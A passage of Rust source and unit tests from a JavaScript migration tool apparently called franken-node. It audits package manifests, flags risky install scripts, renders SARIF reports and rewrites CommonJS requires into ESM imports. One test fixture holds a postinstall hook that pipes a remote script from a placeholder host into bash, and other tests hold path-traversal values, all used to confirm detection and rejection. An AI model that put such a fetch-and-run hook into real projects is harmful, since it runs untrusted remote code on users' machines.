    let mut specifiers = BTreeSet::new();
    for line in source.lines() {
        let trimmed = line.trim_start();
        if is_ignorable_js_line(trimmed) {
            continue;
        }
        let module_like = trimmed.starts_with("import ")
            || trimmed.starts_with("export ")
            || trimmed.contains(" require(")
            || trimmed.contains("require(");
        if !module_like {
            continue;
        }
        for literal in quoted_relative_literals(trimmed) {
            specifiers.insert(literal);
        }
    }
    specifiers.into_iter().collect()
}

fn quoted_relative_literals(line: &str) -> Vec<String> {
    let bytes = line.as_bytes();
    let mut literals = BTreeSet::new();
    let mut index = 0_usize;
    while index < bytes.len() {
        let quote = bytes[index];
        if quote != b'\'' && quote != b'"' {
            index = index.saturating_add(1);
            continue;
        }

        let literal_start = index.saturating_add(1);
        index = literal_start;
        let mut escaped = false;
        while index < bytes.len() {
            let byte = bytes[index];
            if escaped {
                escaped = false;
            } else if byte == b'\\' {
                escaped = true;
            } else if byte == quote {
                if let Some(literal) = line.get(literal_start..index)
                    && is_relative_module_specifier(literal)
                {
                    literals.insert(literal.to_string());
                }
                break;
            }
            index = index.saturating_add(1);
        }
        index = index.saturating_add(1);
    }
    literals.into_iter().collect()
}

fn is_relative_module_specifier(specifier: &str) -> bool {
    specifier.starts_with("./") || specifier.starts_with("../")
}

fn collect_risky_script_names(manifest: &serde_json::Value) -> Vec<String> {
    let mut risky: Vec<String> = Vec::new();
    if let Some(scripts) = manifest
        .get("scripts")
        .and_then(serde_json::Value::as_object)
    {
        for (script_name, command_value) in scripts {
            if let Some(command) = command_value.as_str()
                && is_risky_script(script_name, command)
            {
                risky.push(script_name.to_string());
            }
        }
    }
    risky.sort();
    risky
}

fn append_summary_findings(
    summary: &MigrationAuditSummary,
    engine_gaps: usize,
    findings: &mut Vec<MigrationAuditFinding>,
) {
    if summary.package_manifests == 0 {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::High,
                message: "no package.json files found in target project".to_string(),
                path: None,
                recommendation: Some(
                    "Initialize a package manifest before running migrate rewrite/validate."
                        .to_string(),
                ),
            },
            MAX_TOTAL_FINDINGS,
        );
    } else {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::Info,
                message: format!("detected {} package manifest(s)", summary.package_manifests),
                path: None,
                recommendation: None,
            },
            MAX_TOTAL_FINDINGS,
        );
    }

    if summary.lockfiles.is_empty() {
        push_bounded(findings, MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Dependencies,
            severity: MigrationSeverity::Medium,
            message: "no JavaScript lockfile detected".to_string(),
            path: None,
            recommendation: Some(
                "Generate and commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb) before migration."
                    .to_string(),
            ),
        }, MAX_TOTAL_FINDINGS);
    } else {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Dependencies,
                severity: MigrationSeverity::Info,
                message: format!("detected {} lockfile(s)", summary.lockfiles.len()),
                path: None,
                recommendation: None,
            },
            MAX_TOTAL_FINDINGS,
        );
    }

    if summary.js_files == 0 && summary.ts_files == 0 {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Runtime,
                severity: MigrationSeverity::Low,
                message: "no JavaScript/TypeScript source files found".to_string(),
                path: None,
                recommendation: Some(
                    "Confirm the migration target path points to the intended JS/TS project."
                        .to_string(),
                ),
            },
            MAX_TOTAL_FINDINGS,
        );
    } else if summary.js_files > 0 && summary.ts_files == 0 {
        push_bounded(findings, MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Medium,
            message: format!(
                "found {} JavaScript files and no TypeScript files",
                summary.js_files
            ),
            path: None,
            recommendation: Some(
                "Prioritize lockstep validation coverage because runtime assumptions are untyped."
                    .to_string(),
            ),
        }, MAX_TOTAL_FINDINGS);
    } else {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Runtime,
                severity: MigrationSeverity::Info,
                message: format!(
                    "found {} JavaScript and {} TypeScript files",
                    summary.js_files, summary.ts_files
                ),
                path: None,
                recommendation: None,
            },
            MAX_TOTAL_FINDINGS,
        );
    }

    if summary.risky_scripts > 0 {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Scripts,
                severity: MigrationSeverity::High,
                message: format!(
                    "detected {} potentially risky install/build script(s)",
                    summary.risky_scripts
                ),
                path: None,
                recommendation: Some(
                    "Review and harden install/build scripts before enabling strict trust policy."
                        .to_string(),
                ),
            },
            MAX_TOTAL_FINDINGS,
        );
    }

    if engine_gaps > 0 {
        push_bounded(
            findings,
            MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Runtime,
                severity: MigrationSeverity::Low,
                message: format!("{} package manifest(s) missing engines.node", engine_gaps),
                path: None,
                recommendation: Some(
                    "Pin engines.node across packages to improve migration determinism."
                        .to_string(),
                ),
            },
            MAX_TOTAL_FINDINGS,
        );
    }
}

fn sort_and_assign_ids(findings: &mut [MigrationAuditFinding]) {
    findings.sort_by(|left, right| {
        right
            .severity
            .rank()
            .cmp(&left.severity.rank())
            .then_with(|| left.category.cmp(&right.category))
            .then_with(|| left.message.cmp(&right.message))
            .then_with(|| left.path.cmp(&right.path))
    });

    for (index, finding) in findings.iter_mut().enumerate() {
        finding.id = format!("mig-audit-{:03}", index.saturating_add(1));
    }
}

fn relative_display(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

fn render_human_audit_report(report: &MigrationAuditReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate audit");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(&mut output, "generated_at_utc: {}", report.generated_at_utc);
    let _ = writeln!(
        &mut output,
        "summary: files={} js={} ts={} manifests={} lockfiles={} risky_scripts={}",
        report.summary.files_scanned,
        report.summary.js_files,
        report.summary.ts_files,
        report.summary.package_manifests,
        report.summary.lockfiles.len(),
        report.summary.risky_scripts
    );

    if !report.summary.lockfiles.is_empty() {
        let _ = writeln!(
            &mut output,
            "lockfiles: {}",
            report.summary.lockfiles.join(", ")
        );
    }

    let _ = writeln!(&mut output, "findings ({}):", report.findings.len());
    for finding in &report.findings {
        let _ = writeln!(
            &mut output,
            "- [{}:{}] {}{}",
            finding.id,
            match finding.severity {
                MigrationSeverity::Info => "info",
                MigrationSeverity::Low => "low",
                MigrationSeverity::Medium => "medium",
                MigrationSeverity::High => "high",
            },
            finding.message,
            finding
                .path
                .as_ref()
                .map_or_else(String::new, |path| format!(" (path: {path})"))
        );
        if let Some(recommendation) = &finding.recommendation {
            let _ = writeln!(&mut output, "  recommendation: {recommendation}");
        }
    }

    output
}

fn render_sarif(report: &MigrationAuditReport) -> anyhow::Result<String> {
    let results = report
        .findings
        .iter()
        .map(|finding| {
            serde_json::json!({
                "ruleId": finding.id,
                "level": finding.severity.as_sarif_level(),
                "message": {"text": finding.message},
                "locations": finding.path.as_ref().map(|path| vec![serde_json::json!({
                    "physicalLocation": {"artifactLocation": {"uri": path}}
                })]).unwrap_or_default(),
            })
        })
        .collect::<Vec<_>>();

    let sarif = serde_json::json!({
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "franken-node migrate audit",
                    "informationUri": "https://github.com/Dicklesworthstone/franken_node",
                }
            },
            "invocations": [{
                "executionSuccessful": true
            }],
            "results": results
        }]
    });

    serde_json::to_string_pretty(&sarif)
        .map_err(|err| anyhow::anyhow!("failed to serialize migration audit SARIF: {err}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write_project_file(project: &Path, relative_path: &str, content: &str) {
        let path = project.join(relative_path);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).expect("create parent dir");
        }
        std::fs::write(path, content).expect("write project file");
    }

    fn write_hardened_manifest(project: &Path) {
        write_project_file(
            project,
            "package.json",
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{"test":"node test.js"}
            }"#,
        );
    }

    fn write_lockfile(project: &Path) {
        write_project_file(project, "package-lock.json", "{}\n");
    }

    #[test]
    fn parse_audit_output_format_is_case_insensitive() {
        assert_eq!(
            AuditOutputFormat::parse("json"),
            Ok(AuditOutputFormat::Json)
        );
        assert_eq!(
            AuditOutputFormat::parse("TEXT"),
            Ok(AuditOutputFormat::Text)
        );
        assert_eq!(
            AuditOutputFormat::parse("Sarif"),
            Ok(AuditOutputFormat::Sarif)
        );
        assert!(AuditOutputFormat::parse("yaml").is_err());
    }

    #[test]
    fn run_audit_flags_risky_scripts_and_missing_lockfiles() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_audit(project).expect("audit should succeed");

        assert_eq!(report.summary.package_manifests, 1);
        assert_eq!(report.summary.js_files, 1);
        assert_eq!(report.summary.ts_files, 0);
        assert_eq!(report.summary.risky_scripts, 1);
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.message.contains("risky install/build script"))
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.message.contains("no JavaScript lockfile"))
        );
    }

    #[test]
    fn render_text_report_contains_summary_and_findings() {
        let report = MigrationAuditReport {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/demo".to_string(),
            generated_at_utc: "2026-02-26T00:00:00Z".to_string(),
            summary: MigrationAuditSummary {
                files_scanned: 3,
                js_files: 2,
                ts_files: 1,
                package_manifests: 1,
                risky_scripts: 1,
                lockfiles: vec!["package-lock.json".to_string()],
            },
            findings: vec![MigrationAuditFinding {
                id: "mig-audit-001".to_string(),
                category: MigrationCategory::Scripts,
                severity: MigrationSeverity::High,
                message: "risky install/build script pattern detected in package.json".to_string(),
                path: Some("package.json".to_string()),
                recommendation: Some("Harden install scripts before rollout.".to_string()),
            }],
        };

        let rendered = render_audit_report(&report, AuditOutputFormat::Text).expect("text");
        assert!(rendered.contains("franken-node migrate audit"));
        assert!(rendered.contains("summary: files=3 js=2 ts=1 manifests=1 lockfiles=1"));
        assert!(rendered.contains("- [mig-audit-001:high]"));
        assert!(rendered.contains("recommendation: Harden install scripts before rollout."));
    }

    #[test]
    fn render_sarif_emits_findings() {
        let report = MigrationAuditReport {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/demo".to_string(),
            generated_at_utc: "2026-02-26T00:00:00Z".to_string(),
            summary: MigrationAuditSummary {
                files_scanned: 1,
                js_files: 1,
                ts_files: 0,
                package_manifests: 0,
                risky_scripts: 0,
                lockfiles: Vec::new(),
            },
            findings: vec![MigrationAuditFinding {
                id: "mig-audit-001".to_string(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::High,
                message: "no package.json files found in target project".to_string(),
                path: None,
                recommendation: None,
            }],
        };

        let rendered = render_audit_report(&report, AuditOutputFormat::Sarif).expect("sarif");
        let parsed: serde_json::Value = serde_json::from_str(&rendered).expect("valid json");
        let result_count = parsed["runs"][0]["results"]
            .as_array()
            .map_or(0, std::vec::Vec::len);
        assert_eq!(result_count, 1);
    }

    #[test]
    fn run_rewrite_apply_is_idempotent_after_first_engine_pin() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "index.js", "console.log('hello');");
        write_project_file(
            project,
            "package.json",
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        );

        let first = run_rewrite(project, true).expect("first rewrite");
        let after_first =
            std::fs::read_to_string(project.join("package.json")).expect("read rewritten package");
        let second = run_rewrite(project, true).expect("second rewrite");
        let after_second =
            std::fs::read_to_string(project.join("package.json")).expect("read package again");

        assert_eq!(first.rewrites_planned, 1);
        assert_eq!(first.rewrites_applied, 1);
        assert_eq!(first.rollback_entries.len(), 1);
        assert_eq!(second.rewrites_planned, 0);
        assert_eq!(second.rewrites_applied, 0);
        assert!(second.rollback_entries.is_empty());
        assert_eq!(after_second, after_first);
    }

    #[test]
    fn run_rewrite_dry_run_is_idempotent_and_does_not_mutate_manifest() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original = r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#;

        write_project_file(project, "package.json", original);

        let first = run_rewrite(project, false).expect("first dry run");
        let after_first =
            std::fs::read_to_string(project.join("package.json")).expect("read package");
        let second = run_rewrite(project, false).expect("second dry run");
        let after_second =
            std::fs::read_to_string(project.join("package.json")).expect("read package again");

        assert_eq!(first.rewrites_planned, 1);
        assert_eq!(first.rewrites_applied, 0);
        assert_eq!(second.rewrites_planned, 1);
        assert_eq!(second.rewrites_applied, 0);
        assert_eq!(after_first, original);
        assert_eq!(after_second, original);
        assert_eq!(
            first.rollback_entries[0].rewritten_content,
            second.rollback_entries[0].rewritten_content
        );
    }

    #[test]
    fn run_rewrite_preserves_existing_node_engine_without_rollback_entry() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original = r#"{
          "name":"demo",
          "version":"1.0.0",
          "engines":{"node":"22.x"},
          "scripts":{"test":"franken-node test.js"}
        }"#;

        write_project_file(project, "package.json", original);

        let report = run_rewrite(project, true).expect("rewrite no-op");
        let after = std::fs::read_to_string(project.join("package.json")).expect("read package");

        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(report.rewrites_applied, 0);
        assert!(report.rollback_entries.is_empty());
        assert_eq!(after, original);
    }

    #[test]
    fn build_rollback_plan_emits_serializable_original_and_rewritten_manifest() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original = r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#;

        write_project_file(project, "package.json", original);

        let report = run_rewrite(project, false).expect("dry-run rewrite");
        let plan = build_rollback_plan(&report);
        let serialized = serde_json::to_value(&plan).expect("rollback plan serializes");

        assert_eq!(plan.schema_version, "1.0.0");
        assert!(!plan.apply_mode);
        assert_eq!(plan.entry_count, 1);
        assert_eq!(plan.entries[0].path, "package.json");
        assert_eq!(plan.entries[0].original_content, original);
        assert!(plan.entries[0].rewritten_content.contains("\"engines\""));
        assert!(
            plan.entries[0]
                .rewritten_content
                .contains("\"node\": \">=20 <23\"")
        );
        assert_eq!(serialized["schema_version"], "1.0.0");
        assert_eq!(serialized["apply_mode"], serde_json::Value::Bool(false));
        assert_eq!(serialized["entry_count"].as_u64(), Some(1));
    }

    #[test]
    fn build_rollback_plan_records_multiple_manifest_entries_in_path_order() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(
            project,
            "package.json",
            r#"{"name":"root","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        );
        write_project_file(
            project,
            "packages/app/package.json",
            r#"{"name":"app","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        );

        let report = run_rewrite(project, false).expect("dry-run rewrite");
        let plan = build_rollback_plan(&report);
        let paths = plan
            .entries
            .iter()
            .map(|entry| entry.path.as_str())
            .collect::<Vec<_>>();

        assert_eq!(plan.entry_count, 2);
        assert_eq!(paths, vec!["package.json", "packages/app/package.json"]);
        assert!(plan.entries.iter().all(|entry| {
            entry.original_content.contains("\"scripts\"")
                && entry.rewritten_content.contains("\"node\": \">=20 <23\"")
        }));
    }

    #[test]
    fn build_rollback_plan_for_noop_rewrite_emits_empty_artifact() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_hardened_manifest(project);

        let report = run_rewrite(project, false).expect("dry-run rewrite");
        let plan = build_rollback_plan(&report);

        assert_eq!(report.package_manifests_scanned, 1);
        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(plan.entry_count, 0);
        assert!(plan.entries.is_empty());
    }

    #[test]
    fn validate_rollback_plan_rejects_backslash_path_separator() {
        let plan = MigrationRollbackPlan {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/project".to_string(),
            generated_at_utc: "2026-04-24T00:00:00Z".to_string(),
            apply_mode: false,
            entry_count: 1,
            entries: vec![MigrationRollbackEntry {
                path: "src\\index.js".to_string(),
                original_content: "old".to_string(),
                rewritten_content: "new".to_string(),
            }],
        };

        let err = validate_rollback_plan(&plan, &default_rollback_validation_policy())
            .expect_err("backslash path separator must be rejected");

        assert_eq!(
            err,
            MigrationRollbackValidationError::UnsafePathSeparator {
                index: 0,
                path: "src\\index.js".to_string(),
            }
        );
    }

    #[test]
    fn validate_rollback_plan_rejects_backslash_parent_traversal_vector() {
        let plan = MigrationRollbackPlan {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/project".to_string(),
            generated_at_utc: "2026-04-24T00:00:00Z".to_string(),
            apply_mode: false,
            entry_count: 1,
            entries: vec![MigrationRollbackEntry {
                path: "..\\package.json".to_string(),
                original_content: "old".to_string(),
                rewritten_content: "new".to_string(),
            }],
        };

        let err = validate_rollback_plan(&plan, &default_rollback_validation_policy())
            .expect_err("backslash traversal vector must be rejected");

        assert_eq!(
            err,
            MigrationRollbackValidationError::UnsafePathSeparator {
                index: 0,
                path: "..\\package.json".to_string(),
            }
        );
    }

    #[test]
    fn run_rewrite_can_apply_node_engine_pin() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        )
        .expect("write package");

        let dry_run = run_rewrite(project, false).expect("dry-run rewrite");
        assert_eq!(dry_run.rewrites_planned, 1);
        assert_eq!(dry_run.rewrites_applied, 0);
        assert_eq!(dry_run.rollback_entries.len(), 1);
        assert!(
            dry_run
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::PinNodeEngine)
        );

        let applied = run_rewrite(project, true).expect("applied rewrite");
        assert_eq!(applied.rewrites_planned, 1);
        assert_eq!(applied.rewrites_applied, 1);

        let rewritten =
            std::fs::read_to_string(project.join("package.json")).expect("read rewritten package");
        let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("valid json");
        assert_eq!(
            parsed
                .get("engines")
                .and_then(serde_json::Value::as_object)
                .and_then(|engines| engines.get("node"))
                .and_then(serde_json::Value::as_str),
            Some(">=20 <23")
        );
        assert_eq!(
            parsed
                .get("scripts")
                .and_then(serde_json::Value::as_object)
                .and_then(|scripts| scripts.get("test"))
                .and_then(serde_json::Value::as_str),
            Some("franken-node test.js")
        );
    }

    #[test]
    fn run_rewrite_rewrites_node_and_bun_package_scripts() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "src/index.js", "import './dep.mjs';\n");
        write_project_file(project, "src/dep.mjs", "export const dep = 1;\n");
        write_project_file(project, "tools/build.mjs", "console.log('build');\n");
        write_project_file(
            project,
            "package.json",
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{
                "start":"node src/index.js --watch",
                "build":"bun tools/build.mjs",
                "already":"franken-node src/index.js",
                "lint":"eslint ."
              }
            }"#,
        );

        let report = run_rewrite(project, true).expect("package script rewrite");
        let rewritten =
            std::fs::read_to_string(project.join("package.json")).expect("read package");
        let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("valid manifest");

        assert_eq!(report.rewrites_planned, 1);
        assert_eq!(report.rewrites_applied, 1);
        assert_eq!(report.rollback_entries.len(), 1);
        assert_eq!(
            parsed["scripts"]["start"],
            "franken-node src/index.js --watch"
        );
        assert_eq!(parsed["scripts"]["build"], "franken-node tools/build.mjs");
        assert_eq!(parsed["scripts"]["already"], "franken-node src/index.js");
        assert_eq!(parsed["scripts"]["lint"], "eslint .");
        assert_eq!(
            report
                .entries
                .iter()
                .filter(|entry| entry.action == MigrationRewriteAction::RewritePackageScript)
                .count(),
            2
        );
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::ModuleGraphDiscovery
                && entry.detail.contains("script `already`")
                && entry.detail.contains("src/dep.mjs")
        }));
    }

    #[test]
    fn run_rewrite_rewrites_shell_aware_package_scripts() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(project, "src/index.js", "console.log('start');\n");
        write_project_file(project, "tools/build.mjs", "console.log('build');\n");
        write_project_file(project, "scripts/check.js", "console.log('check');\n");
        write_project_file(project, "scripts/my task.js", "console.log('quoted');\n");
        write_project_file(
            project,
            "package.json",
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{
                "compound":"NODE_OPTIONS=--enable-source-maps node src/index.js && bun tools/build.mjs || npm run fallback",
                "env":"env NODE_OPTIONS='--trace-warnings' node \"scripts/my task.js\"",
                "pnpm":"pnpm exec -- node scripts/check.js",
                "yarn":"yarn node scripts/check.js",
                "inline":"node -e \"console.log(1)\"",
                "delegated":"npm run build"
              }
            }"#,
        );

        let report = run_rewrite(project, true).expect("shell-aware package script rewrite");
        let rewritten =
            std::fs::read_to_string(project.join("package.json")).expect("read package");
        let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("valid manifest");

        assert_eq!(report.rewrites_planned, 1);
        assert_eq!(report.rewrites_applied, 1);
        assert_eq!(
            parsed["scripts"]["compound"],
            "NODE_OPTIONS=--enable-source-maps franken-node src/index.js && franken-node tools/build.mjs || npm run fallback"
        );
        assert_eq!(
            parsed["scripts"]["env"],
            "env NODE_OPTIONS='--trace-warnings' franken-node \"scripts/my task.js\""
        );
        assert_eq!(
            parsed["scripts"]["pnpm"],
            "pnpm exec -- franken-node scripts/check.js"
        );
        assert_eq!(
            parsed["scripts"]["yarn"],
            "yarn franken-node scripts/check.js"
        );
        assert_eq!(parsed["scripts"]["inline"], "node -e \"console.log(1)\"");
        assert_eq!(parsed["scripts"]["delegated"], "npm run build");
        assert_eq!(
            report
                .entries
                .iter()
                .filter(|entry| entry.action == MigrationRewriteAction::RewritePackageScript)
                .count(),
            4
        );
    }

    #[test]
    fn run_rewrite_discovers_transitive_js_mjs_module_graph() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(
            project,
            "src/index.js",
            "import util from './util.js';\nconst nested = require('./nested');\nconsole.log(util, nested);\n",
        );
        write_project_file(project, "src/util.js", "export default 42;\n");
        write_project_file(project, "src/nested.mjs", "export const nested = true;\n");
        write_project_file(
            project,
            "package.json",
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{"start":"franken-node src/index.js"}
            }"#,
        );

        let report = run_rewrite(project, false).expect("module graph discovery");

        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(report.rewrites_applied, 0);
        assert!(report.rollback_entries.is_empty());
        let graph_entry = report
            .entries
            .iter()
            .find(|entry| entry.action == MigrationRewriteAction::ModuleGraphDiscovery)
            .expect("module graph entry");
        assert!(graph_entry.detail.contains("src/index.js"));
        assert!(graph_entry.detail.contains("src/util.js"));
        assert!(graph_entry.detail.contains("src/nested.mjs"));
    }

    #[test]
    fn run_rewrite_uses_package_type_module_for_js_import_rewrites() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original_source =
            "import fs from \"fs\";\nexport const exists = fs.existsSync(\"package.json\");\n";

        write_project_file(
            project,
            "package.json",
            r#"{"name":"demo","version":"1.0.0","type":"module","engines":{"node":">=20 <23"}}"#,
        );
        write_project_file(project, "src/index.js", original_source);

        let report = run_rewrite(project, true).expect("esm import rewrite");

        assert_eq!(report.rewrites_planned, 1);
        assert_eq!(report.rewrites_applied, 1);
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::RewriteEsmImport
                && entry.path.as_deref() == Some("src/index.js")
        }));
        assert!(!report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::RewriteCommonJsRequire
                && entry.path.as_deref() == Some("src/index.js")
        }));
        let rewritten = std::fs::read_to_string(project.join("src/index.js")).expect("read source");
        assert!(rewritten.contains("import fs from \"node:fs\";"));
        assert!(!rewritten.contains("import fs from \"fs\";"));
    }

    #[test]
    fn run_rewrite_treats_mjs_as_esm_without_package_type() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(
            project,
            "package.json",
            r#"{"name":"demo","version":"1.0.0","engines":{"node":">=20 <23"}}"#,
        );
        write_project_file(
            project,
            "src/index.mjs",
            "import path from \"path\";\nexport default path.sep;\n",
        );

        let report = run_rewrite(project, true).expect("mjs import rewrite");

        assert_eq!(report.rewrites_planned, 1);
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::RewriteEsmImport
                && entry.path.as_deref() == Some("src/index.mjs")
        }));
        let rewritten =
            std::fs::read_to_string(project.join("src/index.mjs")).expect("read source");
        assert!(rewritten.contains("import path from \"node:path\";"));
    }

    #[test]
    fn run_rewrite_preserves_cjs_boundary_inside_type_module_package() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        write_project_file(
            project,
            "package.json",
            r#"{"name":"demo","version":"1.0.0","type":"module","engines":{"node":">=20 <23"}}"#,
        );
        write_project_file(
            project,
            "src/legacy.cjs",
            "const fs = require(\"fs\");\nmodule.exports = { fs };\n",
        );

        let report = run_rewrite(project, false).expect("cjs boundary rewrite plan");

        assert_eq!(report.rewrites_planned, 1);
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::RewriteCommonJsRequire
                && entry.path.as_deref() == Some("src/legacy.cjs")
        }));
        assert!(!report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::RewriteEsmImport
                && entry.path.as_deref() == Some("src/legacy.cjs")
        }));
    }

    #[test]
    fn run_rewrite_marks_mixed_import_and_require_for_manual_review() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let source = "import fs from \"fs\";\nconst path = require(\"path\");\nexport const sep = path.sep;\n";

        write_project_file(
            project,
            "package.json",
            r#"{"name":"demo","version":"1.0.0","type":"module","engines":{"node":">=20 <23"}}"#,
        );
        write_project_file(project, "src/index.js", source);

        let report = run_rewrite(project, true).expect("mixed module review");

        assert_eq!(report.rewrites_planned, 0);
        assert_eq!(report.rewrites_applied, 0);
        assert!(report.rollback_entries.is_empty());
        assert!(report.entries.iter().any(|entry| {
            entry.action == MigrationRewriteAction::ManualModuleReview
                && entry.path.as_deref() == Some("src/index.js")
                && entry.detail.contains("ESM/CJS module mixing")
        }));
        let unchanged = std::fs::read_to_string(project.join("src/index.js")).expect("read source");
        assert_eq!(unchanged, source);
    }

    #[test]
    fn run_rewrite_rewrites_commonjs_requires_and_writes_backup() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original_source = "const fs = require(\"fs\");\nconst local = require(\"./local\");\nconsole.log(fs.existsSync(\"package.json\"), local);\n";

        write_hardened_manifest(project);
        write_project_file(project, "index.js", original_source);

        let report = run_rewrite(project, true).expect("applied source rewrite");

        assert_eq!(report.rewrites_planned, 1);
        assert_eq!(report.rewrites_applied, 1);
        assert_eq!(report.rollback_entries.len(), 1);
        assert!(
            report
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::RewriteCommonJsRequire)
        );
        assert_eq!(report.rollback_entries[0].path, "index.js");
        assert_eq!(report.rollback_entries[0].original_content, original_source);

        let rewritten = std::fs::read_to_string(project.join("index.js")).expect("read source");
        assert!(rewritten.contains("import fs from \"node:fs\";"));
        assert!(rewritten.contains("import local from \"./local\";"));
        assert!(!rewritten.contains("require("));

        let backup = std::fs::read_to_string(project.join(".migrate-backup/index.js"))
            .expect("read source backup");
        assert_eq!(backup, original_source);
    }

    #[test]
    fn run_rewrite_rewrites_commonjs_destructuring_exports_and_nested_requires() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();
        let original_source = "#!/usr/bin/env node\nconst { readFile, writeFile: write } = require('fs'); // fs api\nconst literal = \"require('path') remains a string\";\n// const fake = require('crypto');\nfunction platform() {\n  const os = require(\"os\");\n  return os.platform();\n}\nmodule.exports = { readFile, writer: write };\n";

        write_hardened_manifest(project);
        write_project_file(project, "index.js", original_source);

        let report = run_rewrite(project, true).expect("applied ast-aware source rewrite");

        assert_eq!(report.rewrites_planned, 1);
        assert_eq!(report.rewrites_applied, 1);
        assert_eq!(report.rollback_entries.len(), 1);
        let rewritten = std::fs::read_to_string(project.join("index.js")).expect("read source");
        assert!(rewritten.starts_with("#!/usr/bin/env node\n"));
        assert!(
            rewritten
                .contains("import { readFile, writeFile as write } from \"node:fs\"; // fs api")
        );
        assert!(rewritten.contains("import os from \"node:os\";"));
        assert!(rewritten.contains("export { readFile, write as writer };"));
        assert!(rewritten.contains("const literal = \"require('path') remains a string\";"));
        assert!(rewritten.contains("// const fake = require('crypto');"));
        assert!(!rewritten.contains("const os = require(\"os\")"));
        assert_eq!(
            std::fs::read_to_string(project.join(".migrate-backup/index.js"))
                .expect("read source backup"),
            original_source
        );
    }

    #[test]
    fn rewrite_commonjs_requires_ignores_comment_and_string_require_calls() {
        let source = "const literal = \"require('fs')\";\n// const fake = require('path');\nconst path = require('path');\n";

        let rewrite = rewrite_commonjs_requires(source);

        assert_eq!(rewrite.rewrite_count, 1);
        assert!(rewrite.manual_findings.is_empty());
        assert!(
            rewrite
                .rewritten_content
                .contains("import path from \"node:path\";")
        );
        assert!(
            rewrite
                .rewritten_content
